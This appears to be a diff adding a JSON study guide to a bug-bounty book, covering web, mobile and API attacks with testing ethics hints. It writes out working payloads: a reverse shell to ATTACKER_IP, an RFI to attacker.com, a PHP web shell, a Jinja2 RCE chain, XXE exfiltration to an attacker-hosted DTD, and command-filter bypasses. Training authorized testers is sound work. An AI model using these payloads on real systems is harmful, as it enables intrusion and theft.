+        "Recognize serialized objects: PHP 'O:4:\"User\":2:{s:8:\"username\";...}'; Java starts with hex 'AC ED 00 05' or base64 'rO0' or Content-Type application/x-java-serialized-object; Python pickle often base64.",
+        "Look for serialized blobs in cookies, body params, headers, auth tokens, files; decode base64/URL when needed.",
+        "If you can edit serialized fields safely (no signing/encryption), tamper with role/username/status (e.g., 'not admin' -> 'admin') and re-serialize, adjusting length markers.",
+        "For RCE via PHP, look at __wakeup() / __destruct() / __toString() / __call() magic methods in the codebase. If a class is reachable that runs eval() or system() on a controllable property, instantiate it.",
+        "Build POP chains when no single class is exploitable: instantiate Class A whose __wakeup() calls Class B's method on a controllable property, chaining gadgets in the application's codebase.",
+        "Java: use Ysoserial gadget chains in popular libs (Apache Commons-Collections, Spring, Groovy, Commons FileUpload). Command: 'java -jar ysoserial.jar CommonsCollections1 \"command\"'."
+      ],
+      "tools_and_payloads": [
+        "ysoserial (frohoff/ysoserial) for Java gadget chains",
+        "PHPGGC equivalent for PHP (mention concept)",
+        "Burp Decoder for base64/URL",
+        "OWASP Deserialization Cheat Sheet",
+        "GrrrDog/Java-Deserialization-Cheat-Sheet",
+        "Magic methods PHP: __wakeup, __destruct, __toString, __call",
+        "Java entry: readObject()",
+        "Python entry: pickle.loads()",
+        "Ruby entry: Marshal.load(), yaml.load()"
+      ],
+      "bypass_techniques": [
+        "Patch the serialized string directly, adjusting the length prefix (s:5:\"admin\" vs s:9:\"not admin\").",
+        "URL-encode the serialized payload when injecting via a cookie.",
+        "When the app blocks a specific class, use any other class in scope (or a third-party lib) with usable gadgets."
+      ],
+      "escalation_impact_tips": [
+        "RCE via __wakeup -> eval, or full POP chains for PHP.",
+        "Java RCE via ysoserial-generated payloads opens calc.exe / reverse shells.",
+        "SQL injection via POP chain when a class's getValue() builds SQL from a property.",
+        "Authentication bypass by tampering identity fields when the object is the session token.",
+        "Half of disclosed deserialization vulns are PHP and most resolve as Critical."
+      ],
+      "report_template_hints": [
+        "Include the raw and re-encoded serialized blob.",
+        "Provide a generator script (small PHP/Java snippet) that produced the payload.",
+        "Use a harmless test (phpinfo(), 'touch /tmp/test_<name>.txt') as POC, never a destructive command."
+      ]
+    },
+    {
+      "chapter_number": 15,
+      "title": "XML External Entity",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "XXE (classic, blind, XInclude, billion laughs)",
+      "recon_stage": null,
+      "topic": "XML External Entity",
+      "methodology": [
+        "Step 1: Find XML entry points — search HTTP messages for '<?xml' or tree-like tags; decode base64 (LD94bWw == '<?xml') to spot encoded XML. Also look at uploads of XML, DOCX, PPTX, XLSX, GPX, PDF, SVG, RSS, GIF/PNG/JPEG metadata. Try forcing 'Content-Type: text/xml' / 'application/xml' on endpoints that normally take JSON.",
+        "Step 2: Classic XXE — submit '<!DOCTYPE example [<!ENTITY test SYSTEM \"file:///etc/hostname\">]><example>&test;</example>' and see if the file content is reflected. Fall back to PUBLIC keyword if SYSTEM blocked.",
+        "Try standard files: /etc/hostname, /etc/passwd, ~/.bash_history.",
+        "Step 3: Blind XXE — set up an OOB listener (see Ch 13) and have the XML parser fetch '<!ENTITY test SYSTEM \"http://attacker:80/xxe_test.txt\">'. Try ports 80/443 first.",
+        "Step 4: Embed payloads in alt file types: SVG (add DTD + reference &test; in <text>), DOCX/PPTX/XLSX (unzip, edit /word/document.xml or /ppt/presentation.xml or /xl/workbook.xml, repack with 'zip -r').",
+        "Step 5: XInclude attack when you only control a single value: '<example xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/hostname\"/></example>'."
+      ],
+      "tools_and_payloads": [
+        "XmlLint (xmllint.com) to validate payloads",
+        "ONsec-Lab/scripts xxe-ftp-server.rb (FTP listener on port 2121)",
+        "Netcat / Burp Collaborator listeners",
+        "OWASP XXE Prevention Cheat Sheet",
+        "PHP filter wrapper: 'php://filter/convert.base64-encode/resource=/etc/shadow'"
+      ],
+      "bypass_techniques": [
+        "Use PUBLIC keyword when SYSTEM is blocked.",
+        "For files with special chars use CDATA wrapper inside parameter entities or PHP base64 filter to safely encode contents.",
+        "Use FTP exfil (ftp://attacker:2121/?%file;) to avoid HTTP URL length / special-char restrictions.",
+        "Parameter entities + external DTD: host an external DTD (xxe.dtd) on your server with dynamic ENTITY declarations using &#x25; for %, then have target fetch it via '<!ENTITY % xxe SYSTEM \"http://attacker/xxe.dtd\"> %xxe;'.",
+        "Error-based exfil: reference a nonexistent file with the data in the path -> 'java.io.FileNotFoundException: file:///nonexistent/FILE_CONTENTS' leaks contents in the error message."
+      ],
+      "escalation_impact_tips": [
+        "Read local files (/etc/shadow, source code, configs).",
+        "Launch SSRF: '<!ENTITY file SYSTEM \"http://10.0.0.1:80\">' for port scanning; AWS metadata via 169.254.169.254/latest/meta-data/.",
+        "Blind XXE: use parameter entities in external DTD to exfil via attacker URL.",
+        "DoS via 'billion laughs' (nested entity expansion) — NEVER test on live target; usually out of scope.",
+        "Inspect View Source / raw HTTP response for exfiltrated data (browser may not render it)."
+      ],
+      "report_template_hints": [
+        "Include the exact XML payload and the file you retrieved.",
+        "Use a non-sensitive file (/etc/hostname) first, escalate to a more impactful one only with permission.",
+        "If blind, include access-log entries from your listener showing the inbound request."
+      ]
+    },
+    {
+      "chapter_number": 16,
+      "title": "Template Injection",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "Server-Side Template Injection (SSTI)",
+      "recon_stage": null,
+      "topic": "Template Injection",
+      "methodology": [
+        "Step 1: Locate user input that ends up rendered back to the user (same surface as XSS): URL params, headers, body, file uploads, profile fields, bulk-email templates.",
+        "Step 2: Detect with an error-inducing payload: '{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]'. Errors that mention 'jinja2', 'Twig', 'FreeMarker', etc., are a giveaway.",
+        "Try math probes: '{{7*7}}' (Jinja2/Twig/Smarty), '${7*7}' (FreeMarker/Thymeleaf/Mako), '<%= 7*7 %>' (ERB). If 49 is returned, SSTI confirmed.",
+        "Distinguish Jinja2 vs Twig: '{{7*\"7\"}}' returns 7777777 in Jinja2, 49 in Twig.",
+        "When input is already inside expression tags '{{...}}' just provide '7*7' and look for 49.",
+        "Step 3: Determine the engine — error messages, or differential probes above.",
+        "Step 4: Escalate to RCE. In Jinja2/Python:\n'{% for x in [].__class__.__bases__[0].__subclasses__() %}{% if \"catch_warnings\" in x.__name__ %}{{x()._module.__builtins__[\"__import__\"](\"os\").system(\"ls\")}}{%endif%}{%endfor%}'.",
+        "POC: use 'touch template_injection_by_<name>.txt' rather than a destructive command."
+      ],
+      "tools_and_payloads": [
+        "tplmap (epinna/tplmap) for automated SSTI detection and exploitation",
+        "PortSwigger SSTI research page",
+        "Test string '{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]'",
+        "Math probes: {{7*7}}, ${7*7}, <%= 7*7 %>, {{7*'7'}}",
+        "Jinja2 sandbox-escape via [].__class__.__bases__[0].__subclasses__()",
+        "Sandbox-escape references: CTF Wiki, HackTricks, Programmer Help articles"
+      ],
+      "bypass_techniques": [
+        "When import is blocked, use __subclasses__() to reach catch_warnings -> _module -> __builtins__ -> __import__.",
+        "Concatenate / hex-encode function names to slip past blocklists (similar to RCE tricks in Ch 18).",
+        "Loop over subclasses and filter by name to find usable gadget classes."
+      ],
+      "escalation_impact_tips": [
+        "RCE -> read /etc/passwd, /etc/shadow, exfiltrate source/config, escalate privileges, pivot to internal network.",
+        "Each engine has its own escalation path — read engine + language docs."
+      ],
+      "report_template_hints": [
+        "Show the engine identification probe and the math result.",
+        "Use the harmless 'touch <unique>.txt' POC, not 'rm' or reverse shells.",
+        "Cite specific Jinja2 sandbox escape chain."
+      ]
+    },
+    {
+      "chapter_number": 17,
+      "title": "Application Logic Errors and Broken Access Control",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "Application Logic / Broken Access Control / Directory Traversal",
+      "recon_stage": null,
+      "topic": "Application Logic Errors and Broken Access Control",
+      "methodology": [
+        "Step 1: Learn the target — read engineering blogs, docs, browse as a regular user, note new features and integrations (they're least tested).",
+        "Step 2: Intercept every request during sensitive flows (MFA, checkout, password reset, admin panel) and document parameters and headers.",
+        "Step 3: Think outside the box — skip auth steps (jump directly to /security_questions/ after only password), mix payment-mode params ('saved_card=1' + fake 'card_number'), force-browse to /admin/dashboard.php after auth gate, add 'admin=1' cookie, tamper with predictable cookies/headers.",
+        "Hunt directory traversal: insert '../' (and encoded forms '%2e%2e%2f', '%252e%252e%255f', '..%2f') into file params; aim for /etc/shadow, /etc/passwd, source files, config files.",
+        "Look for exposed admin panels behind obscure URLs (find via Google dorks, /wp-admin/admin.php, /admin/, internal-only IP trust)."
+      ],
+      "tools_and_payloads": [
+        "Burp Suite",
+        "Google dorks for admin panels",
+        "Path traversal payloads: ../, ../../, %2e%2e%2f, %252e%252e%255f, ..%2f",
+        "Common files: /etc/shadow, /etc/passwd, /var/www/html/config.php, .env"
+      ],
+      "bypass_techniques": [
+        "Add internal-only headers (X-Forwarded-For: 127.0.0.1, X-Real-IP) when admin panel trusts internal IPs.",
+        "Force browsing past auth pages (auth only on /login, not on /dashboard).",
+        "Different access points (mobile vs web vs API) often have inconsistent auth — try the same action from each."
+      ],
+      "escalation_impact_tips": [
+        "Broken access control on admin panel with console/deploy capability -> RCE.",
+        "Config file leaks -> CVE-able software versions or credentials.",
+        "Chain logic errors with other classes (e.g., reach an internal endpoint that has SQLi)."
+      ],
+      "report_template_hints": [
+        "Walk through the user flow that should occur vs the abusive flow.",
+        "Communicate business impact (free goods, account takeover, leaked data).",
+        "Use creativity in attack scenarios — these bugs are not scannable."
+      ]
+    },
+    {
+      "chapter_number": 18,
+      "title": "Remote Code Execution",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "RCE (code injection, command injection, file inclusion)",
+      "recon_stage": null,
+      "topic": "Remote Code Execution",
+      "methodology": [
+        "Step 1: Recon target's tech stack (Ch 5) — RCE techniques are language/framework-specific.",
+        "Step 2: Identify suspicious user-input locations: every URL/body/header/file-upload field; any param used to construct filepaths.",
+        "Step 3: Submit test payloads.\nPython: 'print(\"RCE test!\")', '__import__(\"os\").system(\"ls\")', '__import__(\"os\").system(\"sleep 10\")'.\nPHP: 'phpinfo();', '<?php system(\"ls\");?>', '<?php system(\"sleep 10\");?>'.\nUnix command injection: ';ls;', '| sleep 10;', '& sleep 10;', '` sleep 10;`', '$(sleep 10)'.\nRFI: '?page=http://attacker.com/malicious.php', '?page=http:attacker.com/malicious.php'.\nLFI: '?page=../uploads/malicious.php', '?page=..%2fuploads%2fmalicious.php'.",
+        "Step 4: Confirm with harmless commands: 'whoami', 'ls', 'sleep 5', or 'cat /etc/passwd'. For POC, run 'touch rce_by_<name>.txt'.",
+        "For blind RCE, use timing (sleep 5) or OOB callbacks (DNS/HTTP listener)."
+      ],
+      "tools_and_payloads": [
+        "Burp Suite",
+        "OOB listener (Netcat, Burp Collaborator)",
+        "ngrok / requestbin for callback URLs",
+        "Reverse shell payload: 'bash -i >& /dev/tcp/ATTACKER_IP/8080 0>&1'",
+        "<?php system($_GET['cmd']); ?> (LFI/RFI shell)",
+        "wget for downloading remote shells when wget is reachable from server"
+      ],
+      "bypass_techniques": [
+        "Unix: insert quotes/double-quotes ('/e'tc'/shadow'), wildcards (/etc/sh*dow), or empty substitutions (/etc/sha``dow, /etc/sha$()dow, /etc/sha${}dow).",
+        "PHP: function-name concatenation ('sys'.'tem')('cat /etc/shadow'); inline comment 'system/**/(\"ls\");'; hex-encoded function names '\\x73\\x79\\x73\\x74\\x65\\x6d'(\"ls\");.",
+        "Python: '__import__(\"o\"+\"s\").system(\"...\")', '__import__(\"\\\\x6f\\\\x73\").system(\"...\")'.",
+        "HTTP parameter pollution / multi-value concatenation: split 'system' across two same-name params if the server concatenates them.",
+        "Encoding variations: URL, double-URL, hex, mixed case, null bytes, newline injection."
+      ],
+      "escalation_impact_tips": [
+        "Classic RCE POC: 'whoami', 'ls', 'cat /etc/passwd', 'touch rce_by_<name>.txt'.",
+        "Blind RCE POC: 'sleep 5' or out-of-band DNS/HTTP callback.",
+        "Reverse shell is often out of scope — get explicit permission first.",
+        "Be extra careful with production data; don't run privilege escalation in a bug bounty context."
+      ],
+      "report_template_hints": [
+        "Specify the exact payload and parameter.",
+        "Demo with a harmless command and create a uniquely named file.",
+        "Don't dump customer data or modify configs."
+      ]
+    },
+    {
+      "chapter_number": 19,
+      "title": "Same-Origin Policy Vulnerabilities",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "SOP bypass (CORS misconfig, postMessage abuse, JSONP, XSS-as-SOP-bypass)",
+      "recon_stage": null,
+      "topic": "Same-Origin Policy Vulnerabilities",
+      "methodology": [
+        "Step 1: Identify SOP relaxation in use. CORS: look for Access-Control-Allow-Origin response headers. postMessage: open DevTools -> Inspect -> Event Listeners and look for 'message' listeners. JSONP: look for <script src=\".../?callback=...\"> or '?jsonp=...'. Also check for document.domain assignments.",
+        "Step 2: For CORS, test three patterns. Set 'Origin: null' (e.g. via a data: doc) and check if A-C-A-O = null. Set 'Origin: attacker.com' and check if reflected. Set 'Origin: www.example.com.attacker.com' to probe weak regex.",
+        "Step 3: For postMessage, build a malicious page that opens/frames the target, then either postMessage to trigger a state change (if receiver doesn't check event.origin) or addEventListener to harvest data (if sender uses wildcard '*' target origin).",
+        "Step 4: For JSONP, embed '<script src=\"https://target/user_info?callback=parseinfo\"></script>' on attacker.com and steal data through your parseinfo function.",
+        "Step 5: Consider mitigations — if the target authenticates via custom headers (not cookies), CORS misconfigs may be unexploitable; if A-C-A-O is wildcard '*', credentials are NOT sent so it's not exploitable."
+      ],
+      "tools_and_payloads": [
+        "Burp Suite (modify Origin header)",
+        "Custom HTML pages with iframes / window.open / postMessage / addEventListener",
+        "DevTools 'Event Listeners' panel"
+      ],
+      "bypass_techniques": [
+        "Force a 'null' origin via data: documents or sandboxed iframes.",
+        "Exploit weak regexes that only check 'startsWith' or 'contains example.com'.",
+        "Sender postMessage with target '*' leaks data; absent event.origin check on receiver accepts attacker messages.",
+        "Use XSS as a complete SOP bypass (script runs in victim's origin)."
+      ],
+      "escalation_impact_tips": [
+        "CORS misconfig on authenticated endpoint -> read DMs, profile data, tokens.",
+        "postMessage missing origin check -> trigger password change as victim.",
+        "JSONP -> harvest authenticated JSON over <script>.",
+        "Automate exploitation to harvest many users' data when applicable."
+      ],
+      "report_template_hints": [
+        "Always include real impact data (what you can read or do as the attacker).",
+        "Reporting bare A-C-A-O: null on a public page is usually not accepted — show authenticated context."
+      ]
+    },
+    {
+      "chapter_number": 20,
+      "title": "Single-Sign-On Security Issues",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "SSO bypass (cookie sharing + subdomain takeover, SAML signature bypass, OAuth token theft, long-lived tokens)",
+      "recon_stage": null,
+      "topic": "Single-Sign-On Security Issues",
+      "methodology": [
+        "Determine SSO mechanism: check Set-Cookie 'Domain=' attribute (cookie sharing), look for XML/SAML messages or saml keyword (SAML), look for oauth/authorize/redirect_uri (OAuth).",
+        "Subdomain takeover hunting: Step 1 enumerate subdomains (Ch 5) -> Step 2 screenshot with EyeWitness/Snapper -> find unregistered third-party pages (look for GitHub Pages 'There isn't a GitHub Pages site here', AWS, Heroku, etc.; reference EdOverflow/can-i-take-over-xyz) -> Step 3 register the page on the third-party host and prove with a benign HTML POC. Then check if shared cookies (Domain=parent.com) flow to your new subdomain.",
+        "SAML hunting: Step 1 intercept the SAML response. Step 2 analyze fields (username/email/userID). Step 3 try modifying the identity field; if signature missing -> done. If signature present, try empty signature, removed signature element, or reverse-engineer weak signing (e.g., base64(username) -> recompute). Step 4 re-encode and replay using SAML Raider (Burp extension).",
+        "OAuth hunting: identify redirect_uri allowlist; find open redirect within an allowlisted URL (use Ch 7 techniques) and chain it to leak access_token from URL fragment. Also test referer-based open redirect by initiating OAuth from attacker.com. Check long-lived tokens by reusing tokens after logout / password reset.",
+        "Build a continuous subdomain-takeover monitor: scan subdomains daily, resolve CNAME, check signature strings, cron to alert."
+      ],
+      "tools_and_payloads": [
+        "EyeWitness / Snapper",
+        "EdOverflow/can-i-take-over-xyz",
+        "SAML Raider (Burp extension)",
+        "Subdomain enumeration (Sublist3r, Amass, Gobuster)",
+        "Cron + custom takeover monitor scripts"
+      ],
+      "bypass_techniques": [
+        "Cookie sharing: take over an unused subdomain via dangling CNAME on AWS/Bitbucket/GitHub Pages (Squarespace/Google Cloud verify ownership and are not vulnerable).",
+        "SAML: empty <SignatureValue>, remove the <Signature> element, replay another user's signature, or forge a predictable signature (base64-based).",
+        "SAML: tamper with encrypted-but-not-signed messages; smuggle SQLi/XSS/XXE through SAML attribute fields.",
+        "OAuth: parameter-based open redirect chained as redirect_uri (e.g., 'https://example.com/callback?next=attacker.com') to leak access_token from URL fragment.",
+        "OAuth: referer-based open redirect by linking from attacker.com to login_via_facebook then watching referer leak the token.",
+        "OAuth open-redirect-chains: pass through a callback URL whose 'next' points to an open redirect on another allowed URL."
+      ],
+      "escalation_impact_tips": [
+        "Subdomain takeover + shared session cookies -> total app compromise (steal session of any logged-in SSO user).",
+        "Subdomain takeover alone -> phishing on legit domain.",
+        "SAML signature bypass -> log in as any user, including admin.",
+        "OAuth access_token theft -> full account access; long-lived tokens persist post-password-reset.",
+        "Pivot stolen creds across the org's internal apps that share SSO."
+      ],
+      "report_template_hints": [
+        "Keep the takeover registered until fixed (else a real attacker could grab it).",
+        "Host only a benign 'Subdomain Takeover by <name>' HTML POC.",
+        "For SAML, include the tampered message and the resulting authenticated session.",
+        "For OAuth, include the crafted URL and a screenshot of the leaked token on attacker.com logs."
+      ]
+    },
+    {
+      "chapter_number": 21,
+      "title": "Information Disclosure",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "Information Disclosure (path traversal, Wayback, paste sites, .git exposure, HTML/JS source leaks)",
+      "recon_stage": null,
+      "topic": "Information Disclosure",
+      "methodology": [
+        "Step 1: Path traversal — manipulate filepath params with '../' (and URL-encoded variants %2e%2e%2f, %252e%252e%255f, ..%2f) to reach /etc/shadow, /etc/passwd, config files, source code.",
+        "Step 2: Search Wayback Machine: visit https://web.archive.org/web/*/DOMAIN/* to list archived URLs, then filter by /admin, .conf, .env, .js, .php to find sensitive or deprecated endpoints. Download interesting archived pages and grep for secrets.",
+        "Step 3: Search paste dumps: Pastebin API, GitHub gists. Use pastebin-scraper (streaak/pastebin-scraper, './scrape.sh -g KEYWORD') and PasteHunter.",
+        "Step 4: Exposed .git directory.\n- Check https://target/.git (404 = safe, 403 = present-no-listing, 200/listing = jackpot).\n- If listing: 'wget -r target/.git'.\n- If no listing but /.git/config readable: rebuild from HEAD -> refs/heads/master -> objects/<2 chars>/<rest>. Use 'git cat-file -t/-p' locally; decompress with 'ruby -rzlib -e \"print Zlib::Inflate.new.inflate(STDIN.read)\" < OBJFILE' or Python zlib.",
+        "Step 5: Information in public HTML/JS — View Source, grep JS files for keys/api_key/password/token; find JS files with LinkFinder."
+      ],
+      "tools_and_payloads": [
+        "Wayback Machine (https://web.archive.org/web/*/DOMAIN/*)",
+        "Waybackurls",
+        "Pastebin API, pastebin-scraper, PasteHunter",
+        "TruffleHog, Gitleaks",
+        "wget -r for /.git scraping",
+        "LinkFinder (GerbenJavado/LinkFinder)",
+        "secret-bridge (duo-labs/secret-bridge)",
+        "Vault (HashiCorp) — defense reference"
+      ],
+      "bypass_techniques": [
+        "Path traversal encoding bypasses: %2e%2e%2f, %252e%252e%255f, ..%2f, mixed case, null bytes."
+      ],
+      "escalation_impact_tips": [
+        "Validate any leaked credentials by using them — outdated keys aren't vulnerabilities.",
+        "Internal IPs / version numbers feed into SSRF and CVE-driven RCE.",
+        "Full .git reconstruction -> conduct white-box code review (Ch 22) for SQLi/XSS/etc.",
+        "Leaked admin password -> account takeover; leaked API tokens -> data access."
+      ],
+      "report_template_hints": [
+        "Show the leak (file path / archived URL / Git object hash) and the sensitive data inside.",
+        "Demonstrate that creds still work (without abusing access).",
+        "Tie the leak to a concrete escalation (SSRF, CVE, RCE) for severity."
+      ]
+    },
+    {
+      "chapter_number": 22,
+      "title": "Conducting Code Reviews",
+      "part": "Part IV: Expert Techniques",
+      "vulnerability_class": "Source code review methodology",
+      "recon_stage": null,
+      "topic": "Conducting Code Reviews",
+      "methodology": [
+        "Fast (grep) approach. Grep for dangerous functions per language:\n- PHP: eval(), assert(), system(), exec(), shell_exec(), passthru(), popen(), backticks, include(), require(), unserialize().\n- Python: eval(), exec(), os.system(), pickle.loads(), yaml.load().\n- JavaScript: document.write(), document.writeln(), document.location.href().\n- Ruby: system(), exec(), %x(), backticks, Marshal.load(), yaml.load().",
+        "Search for leaked secrets: regex for hex/base64 patterns ([a-f0-9]{40} for GitHub tokens), keywords key/secret/password/encrypt/API/login/token. Use TruffleHog entropy scanning.",
+        "Search for weak crypto/hashing: ECB, MD4, MD5, RC4 — look at variable and function names.",
+        "Review new patches and commit history (recent code is buggier); list outdated dependencies via package manifests; cross-reference CVE database; run OWASP Dependency-Check.",
+        "Grep developer comments (#, //) for 'todo', 'fix', 'completed', 'config', 'setup', 'removed' — often points at known issues.",
+        "Find debug functionality and config files: grep HTTP/HTTPS/FTP/dev strings, file extensions .conf/.env/.cnf/.cfg/.ini/.sys/.plist.",
+        "Detailed approach: read code for important functions (auth, password reset, state changes, sensitive reads) and trace user input from entry to all sinks (HTTP params, headers, paths, DB reads, file ops).",
+        "Practice with sample programs — recognize SQLi, open redirect via Location header, command injection in wget invocations, weak referer/CSRF checks, etc."
+      ],
+      "tools_and_payloads": [
+        "grep / ripgrep",
+        "TruffleHog (entropy + regex)",
+        "Gitleaks",
+        "OWASP Dependency-Check",
+        "Static Analysis Security Testing (SAST) tools (commercial + open-source)",
+        "OWASP Code Review Guide"
+      ],
+      "bypass_techniques": [],
+      "escalation_impact_tips": [
+        "White-box review finds bugs (SQLi, deserialization, weak crypto) that black-box testing misses.",
+        "Once a creds leak is found in code, validate access before reporting."
+      ],
+      "report_template_hints": [
+        "Reference exact file path and line numbers from the source.",
+        "Show the dangerous code snippet and trace user input to the sink.",
+        "Suggest a concrete fix (prepared statements, allowlist, parameterized API)."
+      ]
+    },
+    {
+      "chapter_number": 23,
+      "title": "Hacking Android Apps",
+      "part": "Part IV: Expert Techniques",
+      "vulnerability_class": "Mobile (Android) — web vulns over mobile endpoints + mobile-specific issues",
+      "recon_stage": null,
+      "topic": "Hacking Android Apps",
+      "methodology": [
+        "Set up mobile proxy: in Burp Proxy Options add a listener bound to All Interfaces on an unused port; on Android device set Wi-Fi proxy to your computer's IP and that port. Use 'hostname -i' (Linux) or 'ipconfig getifaddr en0' (Mac) for your IP.",
+        "Install Burp's CA cert via http://burp/cert on the device; trust it for VPN and apps.",
+        "Bypass certificate pinning: use Frida + Universal Android SSL Pinning Bypass script, or Objection's 'android sslpinning disable'. For custom pinning, overwrite the packaged cert or patch the validation code.",
+        "Anatomy of APK: AndroidManifest.xml (package, components: Activities/Services/BroadcastReceivers/ContentProviders, permissions), classes.dex (compiled source), resources.arsc, res/, lib/, assets/, META-INF/ (signature).",
+        "Tooling: ADB ('adb devices -l', 'adb install', 'adb pull', 'adb push'); Android Studio (modify + emulate); Apktool ('apktool d example.apk' to extract, 'apktool b example -o example.apk' to repack); Frida for runtime instrumentation; MobSF for automated static+dynamic.",
+        "Hunting: review code in classes.dex, look for hardcoded secrets in res/values/strings.xml and .db/.sqlite files, intercept HTTPS traffic for unique mobile endpoints, compare auth between mobile and web (mobile endpoints often less-tested), look for session management flaws (long-lived tokens, no expiry, reused tokens), insecure crypto / hardcoded keys.",
+        "Treat mobile as additional surface for IDOR/SQLi/XSS/etc. — use the same Burp methodology."
+      ],
+      "tools_and_payloads": [
+        "Burp Suite",
+        "Frida (frida.re) + Universal SSL Pinning Bypass (codeshare.frida.re/@pcipolloni)",
+        "Objection (sensepost/objection)",
+        "ADB (Android Debug Bridge)",
+        "Android Studio + Emulator",
+        "Apktool (ibotpeaches.github.io/Apktool)",
+        "MobSF (MobSF/Mobile-Security-Framework-MobSF)",
+        "OWASP Mobile Security Testing Guide (owasp-mstg)"
+      ],
+      "bypass_techniques": [
+        "SSL pinning bypass via Frida/Objection (automated) or manual cert/code patching."
+      ],
+      "escalation_impact_tips": [
+        "Mobile endpoints often expose IDORs or broken auth web app fixed.",
+        "Hardcoded API keys in strings.xml / lib / assets feed into other attacks.",
+        "Sessions that survive logout/password reset enable persistent takeover."
+      ],
+      "report_template_hints": [
+        "Mention the APK version reviewed and how it was extracted.",
+        "Provide Burp request showing the vulnerable mobile-only endpoint.",
+        "If pinning was bypassed, document the tool used."
+      ]
+    },
+    {
+      "chapter_number": 24,
+      "title": "API Hacking",
+      "part": "Part IV: Expert Techniques",
+      "vulnerability_class": "REST / SOAP / GraphQL API vulnerabilities (broken access control, info leaks, no rate limiting, classic web bugs over APIs)",
+      "recon_stage": null,
+      "topic": "API Hacking",
+      "methodology": [
+        "Recon: read public API docs; check Swagger ('site:target inurl:swagger') for internal docs; browse the app with a proxy to capture API calls; deduce additional endpoints from REST naming patterns ('/posts/ID/read' -> '/posts/ID/edit'); query GraphQL introspection ({__schema{types{name}}}, {__type(name:\"X\"){fields{name}}}); find WSDL files (add '?wsdl' or '.wsdl' to SOAP endpoints); try older versions ('/api/v1/...' when v2 is in use); use fuzzing wordlists (yassineaboukir gist) for endpoint discovery.",
+        "Document every endpoint, its parameters, required tokens, and auth mechanisms.",
+        "Test broken access control: lower-priv account hitting high-priv endpoints; remove tokens / add admin=1 cookie; switch HTTP methods (GET/POST/PUT/PATCH/DELETE); swap user IDs in API calls; in GraphQL, replay another user's mutation.",
+        "Test rate limiting: send 100-200 requests with Burp Intruder or curl on auth endpoints and ID-guessing endpoints. Always get permission and throttle to avoid DoS.",
+        "Test classic web bugs over APIs: SSRF in URL params, race conditions, path traversal in file params, LFI/RFI in file-include params, XXE on XML APIs, insecure deserialization on serialized APIs, reflected XSS when API params are reflected, SQLi everywhere.",
+        "GraphQL-specific: misconfigured authorization on mutations, info leaks via overly verbose responses, introspection often enabled by accident."
+      ],
+      "tools_and_payloads": [
+        "Postman (postman.com)",
+        "GraphQL Playground (graphql/graphql-playground)",
+        "ZAP GraphQL add-on",
+        "Clairvoyance (nikitastupin/clairvoyance) for introspection-disabled GraphQL",
+        "Swagger UI / OpenAPI specs",
+        "Burp Intruder / curl for rate-limit testing",
+        "API wordlist: yassineaboukir/8e12adefbd505ef704674ad6ad48743d"
+      ],
+      "bypass_techniques": [
+        "Old API versions: '/api/v1/...' often lacks newer fixes.",
+        "Different HTTP methods often bypass access controls.",
+        "GraphQL endpoints often have separate auth from REST/web.",
+        "Bypass disabled introspection by inferring schema with Clairvoyance."
+      ],
+      "escalation_impact_tips": [
+        "Endpoint that returns user profile may also return private API tokens of profile owner -> account takeover.",
+        "Lack of rate limit + sequential resource IDs -> mass enumeration of user data.",
+        "GraphQL mutation auth misconfig -> tamper with any user's data.",
+        "XXE/SSRF/RCE via XML/SOAP APIs."
+      ],
+      "report_template_hints": [
+        "Include the exact API call, raw JSON/XML, and the leaked field.",
+        "Always note the API version tested.",
+        "For rate-limit reports, prove exploitability (brute-force creds, harvest IDs) not just absence."
+      ]
+    },
+    {
+      "chapter_number": 25,
+      "title": "Automatic Vulnerability Discovery Using Fuzzers",
+      "part": "Part IV: Expert Techniques",
+      "vulnerability_class": "Fuzzing methodology",
+      "recon_stage": null,
+      "topic": "Fuzzing",
+      "methodology": [
+        "Step 1: Determine data injection points — URL params, body params, headers, cookies. Classify by likely vuln (e.g., numeric ID -> IDOR, search box -> XSS).",
+        "Step 2: Choose payload lists tailored to each vuln. Use SecLists, Big List of Naughty Strings, FuzzDB. Also generate random/long/special-char payloads.",
+        "Step 3: Fuzz. With Burp Intruder mark positions and select payloads (Community is throttled). With Wfuzz, place 'FUZZ' in the URL/body and supply '-w wordlist': 'wfuzz -w wordlist.txt -f output.txt --hc 404 --follow http://target/FUZZ'.",
+        "For authentication brute-forcing: 'wfuzz -w users.txt -w pass.txt --basic FUZZ:FUZ2Z http://target/admin' or fuzz a custom 'Authorization: Basic FUZZ' header.",
+        "For IDOR/open redirect: 'wfuzz -w ids.txt http://target/inbox?user_id=FUZZ', 'wfuzz -w wordlist.txt -v --follow http://target?redirect=FUZZ'.",
+        "For XSS reflection check: 'wfuzz -w xss.txt --filter \"content~FUZZ\" http://target/get_user?user_id=FUZZ'.",
+        "For SQLi: 'wfuzz -w sqli.txt -d \"user_id=FUZZ\" http://target/get_user', watch for response length/time anomalies.",
+        "Step 4: Monitor results — filter by status code (--hc 404), content length, response time. Look for outliers."
+      ],
+      "tools_and_payloads": [
+        "Wfuzz (xmendez/wfuzz, 'pip install wfuzz')",
+        "Burp Intruder (Pro recommended; Community is throttled)",
+        "OWASP ZAP fuzzer",
+        "SecLists (danielmiessler/SecLists)",
+        "Big List of Naughty Strings (minimaxir/big-list-of-naughty-strings)",
+        "FuzzDB (fuzzdb-project/fuzzdb)",
+        "AFL (google/AFL) for compiled binaries",
+        "Sublist3r source (read to learn enumerator architecture)"
+      ],
+      "bypass_techniques": [
+        "Throttle requests to respect rate limits and avoid bans / DoS.",
+        "Vary headers (User-Agent, custom auth headers) to slip past WAFs."
+      ],
+      "escalation_impact_tips": [
+        "Fuzzing finds basic bugs (XSS, SQLi, path enumeration, weak auth); business-logic bugs still require manual review.",
+        "Always pair fuzzing with manual triage — fuzzers are 'metal detectors'."
+      ],
+      "report_template_hints": [
+        "Provide the exact Wfuzz/Intruder command and wordlist used.",
+        "Document the discriminating signal (status code, content length, timing) that flagged the bug."
+      ]
+    }
+  ]
+}
